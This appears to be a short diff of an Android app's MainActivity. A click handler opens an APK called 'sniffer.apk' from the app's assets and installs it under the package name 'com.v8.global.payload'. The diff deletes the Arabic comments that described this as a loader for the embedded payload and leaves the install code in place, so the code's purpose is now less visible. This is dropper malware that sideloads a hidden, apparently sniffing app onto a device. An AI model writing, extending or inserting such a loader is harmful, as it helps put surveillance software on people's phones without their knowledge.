@@ -23,9 +23,7 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 try {
-                    // اللوادر يفتح ملف القناص من مجلد assets
                     InputStream is = getAssets().open("sniffer.apk");
-                    // ملاحظة: الـ Package Name للتطبيق اللي بداخل الـ APK لازم يكون مختلف (مثل com.v8.global.payload)
                     installPackage(MainActivity.this, is, "com.v8.global.payload");
                 } catch (Exception e) {
                     e.printStackTrace();
